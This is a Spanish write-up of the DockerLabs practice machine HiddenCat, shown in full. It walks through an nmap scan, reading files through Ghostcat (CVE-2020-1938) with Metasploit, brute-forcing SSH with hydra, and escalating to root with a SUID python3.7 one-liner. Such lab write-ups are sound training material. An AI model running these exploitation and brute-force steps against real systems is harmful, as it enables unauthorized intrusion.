# Writeup: HiddenCat

- **Máquina:** HiddenCat (DockerLabs)
- **Enlace:** https://dockerlabs.es/maquinas/52/descargar
- **Dificultad:** Fácil
- **Fecha:** 17 de Noviembre 2026

---

## Objetivo
Practicar explotación de Apache Tomcat y escalada de privilegios en Linux hasta `root`.

---

## Despliegue de la máquina
```bash
$ sudo bash auto_deploy.sh hiddencat.tar
```
<img width="525" height="124" alt="Captura de pantalla (331)" src="https://github.com/user-attachments/assets/51801d0e-92fc-42bb-81bc-fad6ca6a4d36" />





Para comprobar que el servicio se encuentre activo se usó `ping`:

```bash
$ ping 172.17.0.2
```
Resultado:
```bash
64 bytes from 172.17.0.2: icmp_seq=1 ttl=64 time=0.611 ms
64 bytes from 172.17.0.2: icmp_seq=2 ttl=64 time=0.057 ms
64 bytes from 172.17.0.2: icmp_seq=3 ttl=64 time=0.083 ms
3 packets transmitted, 3 received, 0% packet loss, time 2062ms
```

---

## 1. Reconocimiento
Se realizó escaneo de puertos con `nmap`, revelando tres puertos abiertos:

```bash
$ nmap -p- -sCV 172.17.0.2 -o scan_hiddencat.txt
```

```bash
PORT   STATE SERVICE
22/tcp   open  ssh     OpenSSH 7.9p1 Debian 10+deb10u4 (protocol 2.0)
8009/tcp open  ajp13   Apache Jserv (Protocol v1.3)
8080/tcp open  http    Apache Tomcat 9.0.30
```




--- 

## 2. Identificación de vulnerabilidades
La versión 9.0.30 de Apache Tomcat junto con el servicio AJP13, es vulnerable a ghostcat **(CVE-2020-1938)**.


---
## 3. Explotación
### 3.1. Lectura de archivos con Metasploit
Se utilizó el módulo `auxiliary/admin/http/tomcat_ghostcat` de Metasploit framework para leer los archivos de la aplicación web.

```bashmsfconsole
$ msfconsole
use auxiliary/admin/http/tomcat_ghostcat
set RHOSTS 172.17.0.2
set RPORT 8009
set FILENAME /WEB-INF/web.xml
run
```

<img width="716" height="146" alt="Captura de pantalla (365)" src="https://github.com/user-attachments/assets/bf529401-9305-46c1-a515-cc67234e6b25" />

Dentro del archivo `web.xml` se encontró el siguiente mensaje que difunde el nombre de un usuario válido:

```bash
  <description>
     Welcome to Tomcat, Jerry ;)
  </description>
```





### 3.2. Ataque de fuerza bruta
Se utilizó `hydra` para realizar ataque de fuerza bruta al usuario **Jerry** y hacerse con sus credenciales.

```bash
$ hydra -l jerry -P /usr/share/wordlists/rockyou.txt 172.17.0.2 ssh
```

```bash
[22][ssh] host: 172.17.0.2   login: jerry   password: chocolate
```

<img width="524" height="52" alt="Captura de pantalla (366)" src="https://github.com/user-attachments/assets/00b9a3cb-da5f-4116-858c-3a677658c944" />


Sabiendo la contraseña, se realizó la conexión a la shell remota **Jerry** mediante `ssh`.

```bash
$ ssh jerry@172.17.0.2
```

```bash
$ whoami
jerry
```

<img width="418" height="91" alt="Captura de pantalla (367)" src="https://github.com/user-attachments/assets/c5b33116-275a-4550-ad58-863ad723d34f" />




### 3.3. Escalada de privilegios
Utilizando `sudo -l` se observó que **Jerry** no puede ejecutar sudo por lo que se optó por buscar archivos importantes que contengan SUID.

<img width="494" height="259" alt="Captura de pantalla (368)" src="https://github.com/user-attachments/assets/024c11b5-e884-4794-97f7-02ebc7e33f9b" />

Se observa que `/python3.7` contiene el bit SUID. Se buscó en [GTFOBins](https://gtfobins.org/) una forma de explotarlo.

```bash
$ /usr/bin/python3.7 -c 'import os; os.execl("/bin/sh", "sh", "-p")'
```

```bash
# whoami
root
```
<img width="515" height="64" alt="Captura de pantalla (369)" src="https://github.com/user-attachments/assets/481fd19b-cf1d-4a7e-9ae5-fe0498ca3291" />


---
